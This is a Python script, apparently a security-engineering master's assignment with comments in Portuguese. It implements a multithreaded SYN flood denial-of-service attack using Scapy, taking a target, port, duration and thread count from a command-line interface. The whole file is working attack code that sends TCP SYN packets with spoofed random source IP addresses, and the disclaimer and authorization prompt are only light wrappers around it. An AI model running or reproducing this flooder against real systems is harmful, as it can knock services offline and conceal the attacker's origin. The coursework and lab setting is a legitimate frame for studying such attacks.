#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Mestrado de Engenharia em Segurança Informatica
Linguagens de Programação Dinamicas - SYN Flooder

Martinho Caeiro (23917)

Este script envia pacotes TCP SYN para simular um ataque de negação de serviço (SYN Flood/DoS).
Utiliza a biblioteca Scapy para manipulação de pacotes a nível de rede.

AVISO LEGAL:
Este script é fornecido apenas para fins educacionais e de testes em laboratorial autorizados.
O uso não autorizado pode violar leis aplicáveis. Use apenas em sistemas que tem autorização
para testar. Um ataque SYN Flood pode danificar infraestruturas críticas.

Uso:
    python3 syn_flooder.py [--target HOST] [--port PORT] [--duration SECONDS] [--threads N]

Exemplo:
    python3 syn_flooder.py --target 192.168.1.1 --port 80 --duration 10
"""

import socket
import sys
import argparse
import time
import threading
import random
from datetime import datetime

def _ensure_package_local(package_name, import_name=None, prompt=True):
    """Minimal local helper to prompt+install a pip package at runtime."""
    import importlib
    import subprocess
    import sys as _sys

    mod_name = import_name or package_name
    try:
        return importlib.import_module(mod_name)
    except Exception:
        pass

    if not prompt:
        return None

    try:
        ans = input(f"Dependency '{package_name}' is missing. Install now? [Y/n]: ").strip().lower()
    except Exception:
        return None

    if ans not in ("", "y", "yes"):
        return None

    cmd = [_sys.executable, "-m", "pip", "install", package_name]
    print(f"Running: {' '.join(cmd)}")
    try:
        res = subprocess.run(cmd)
    except Exception as e:
        print(f"Failed to run pip: {e}")
        return None

    if res.returncode != 0:
        print(f"pip install exited with code {res.returncode}")
        return None

    try:
        return importlib.import_module(mod_name)
    except Exception as e:
        print(f"Installed but failed to import {mod_name}: {e}")
        return None


# Garantir que Scapy está disponível
_ensure_package_local("scapy")

try:
    from scapy.IP import IP
    from scapy.TCP import TCP
    from scapy.layers.inet import IP as IP_Layer, TCP as TCP_Layer
    from scapy.all import send, IP as IP_Scapy, TCP as TCP_Scapy, RandShort
except ImportError:
    try:
        # Fallback para versões antigas de Scapy
        from scapy.all import IP, TCP, send, RandShort
        IP_Scapy = IP
        TCP_Scapy = TCP
    except ImportError:
        print("Erro: Scapy não foi encontrada ou falhou a importação.")
        print("Instale com: pip install scapy")
        sys.exit(1)

# =====================
# SYN Flooder Functions

def generate_random_ip():
    """Gera um IP de origem aleatório (spoof)."""
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"


def generate_random_port():
    """Gera uma porta de origem aleatória."""
    return random.randint(49152, 65535)


def syn_flood_worker(target, target_port, duration, packets_sent, lock):
    """Worker thread que envia pacotes TCP SYN para um alvo."""
    end_time = time.time() + duration
    count = 0

    try:
        while time.time() < end_time:
            # IP de origem aleatório (spoof)
            src_ip = generate_random_ip()
            src_port = generate_random_port()

            # Construir pacote IP + TCP SYN
            try:
                packet = IP_Scapy(dst=target, src=src_ip) / TCP_Scapy(dport=target_port, sport=src_port, flags="S")
                
                # Enviar pacote sem aguardar resposta (send, não sr)
                send(packet, verbose=False)
                count += 1

                # Mostrar progresso a cada 500 pacotes
                if count % 500 == 0:
                    with lock:
                        print(f"  {count:,} pacotes SYN enviados para {target}:{target_port}")

            except Exception as e:
                print(f"  Erro ao enviar pacote: {e}")
                continue

    except KeyboardInterrupt:
        pass
    except PermissionError:
        print("  ERRO: Este script requer privilégios de root/administrator para enviar pacotes raw!")
        print("     Execute com: sudo python3 syn_flooder.py ...")
        sys.exit(1)
    except Exception as e:
        print(f"  Erro: {e}")

    with lock:
        packets_sent.append(count)


def flood_target(target, target_port, duration, num_threads):
    """Envia SYN flood com múltiplas threads."""
    print(f"\nIniciando SYN Flood (TCP)")
    print(f"   Alvo: {target}:{target_port}")
    print(f"   Duração: {duration} segundos")
    print(f"   Threads: {num_threads}")
    print(f"   Protocolo: TCP SYN (Half-Open Connections)")
    print("-" * 60)

    packets_sent = []
    threads = []
    lock = threading.Lock()
    t_start = time.time()

    try:
        # Criar threads
        for i in range(num_threads):
            t = threading.Thread(
                target=syn_flood_worker,
                args=(target, target_port, duration, packets_sent, lock),
                daemon=True
            )
            t.start()
            threads.append(t)

        # Esperar pelas threads
        for t in threads:
            t.join()

    except KeyboardInterrupt:
        print("\nFlood interrompido pelo utilizador.")
    except PermissionError:
        print("\nERRO: Privilégios insuficientes!")
        print("Este script requer privilégios de root para manipular pacotes raw.")
        print("Execute com: sudo python3 syn_flooder.py ...")
        sys.exit(1)

    duration_real = time.time() - t_start
    total_packets = sum(packets_sent)
    pps = total_packets / duration_real if duration_real > 0 else 0

    print("\n" + "=" * 60)
    print("RELATÓRIO - SYN FLOOD")
    print("=" * 60)
    print(f"Alvo: {target}:{target_port}")
    print(f"Total de pacotes SYN enviados: {total_packets:,}")
    print(f"Taxa de envio: {pps:,.0f} pps (pacotes por segundo)")
    print(f"Duração real: {duration_real:.2f}s")
    print(f"Threads utilizadas: {num_threads}")
    print("=" * 60)


def main():
    parser = argparse.ArgumentParser(
        description="SYN Flooder - Ataque de negação de serviço (DoS) via TCP SYN",
        epilog="Apenas para fins educacionais em ambientes autorizados. Requer root/administrator."
    )
    parser.add_argument("--target", "-t", help="Alvo (IP ou hostname)")
    parser.add_argument("--port", "-p", type=int, default=80, help="Porta TCP (default: 80/HTTP)")
    parser.add_argument("--duration", "-d", type=int, default=10, help="Duração em segundos (default: 10)")
    parser.add_argument("--threads", "-n", type=int, default=4, help="Número de threads (default: 4)")

    args = parser.parse_args()

    # Se não foi fornecido alvo, fazer prompt
    if not args.target:
        args.target = input("Alvo (IP ou hostname): ").strip()
        if not args.target:
            print("Nenhum alvo fornecido. Abortando.")
            sys.exit(1)

    # Validações
    if args.port < 1 or args.port > 65535:
        print(f"Porta deve estar entre 1 e 65535")
        sys.exit(1)

    if args.duration < 1:
        print(f"Duração deve ser pelo menos 1 segundo")
        sys.exit(1)

    if args.threads < 1:
        print(f"Número de threads deve ser pelo menos 1")
        sys.exit(1)

    # Resolver hostname se necessário
    try:
        target_ip = socket.gethostbyname(args.target)
        print(f"Alvo resolvido: {args.target} -> {target_ip}")
    except socket.gaierror:
        print(f"Não foi possível resolver {args.target}")
        sys.exit(1)

    # Determinar nome do serviço
    service_name = "unknown"
    try:
        service_name = socket.getservbyport(args.port)
    except OSError:
        pass

    # Confirmação de segurança
    print("=" * 60)
    print("AVISO - SYN FLOOD ATTACK (TCP)")
    print("=" * 60)
    print(f"Está prestes a enviar um ataque DoS para: {args.target}:{args.port} ({service_name})")
    print(f"Duração: {args.duration}s | Threads: {args.threads}")
    print("\nAVISOS IMPORTANTES:")
    print("  1. Este script requer privilégios de root/administrator")
    print("  2. Um ataque SYN Flood pode danificar infraestruturas críticas")
    print("  3. O uso não autorizado é ILEGAL em muitas jurisdições")
    print("  4. Utilize apenas em ambientes de teste autorizados")
    print("-" * 60)

    confirm = input("\nConfirma que tem autorização? (s/N): ").strip().lower()
    if confirm != "s" and confirm != "yes":
        print("Operação cancelada.")
        sys.exit(0)

    # Executar flood
    try:
        flood_target(target_ip, args.port, args.duration, args.threads)
    except PermissionError:
        print("\nERRO: Privilégios insuficientes!")
        print("Este script requer privilégios de root para manipular pacotes raw.")
        print("\nExecute com:")
        print(f"  sudo python3 syn_flooder.py --target {args.target} --port {args.port} --duration {args.duration}")
        sys.exit(1)


if __name__ == "__main__":
    main()
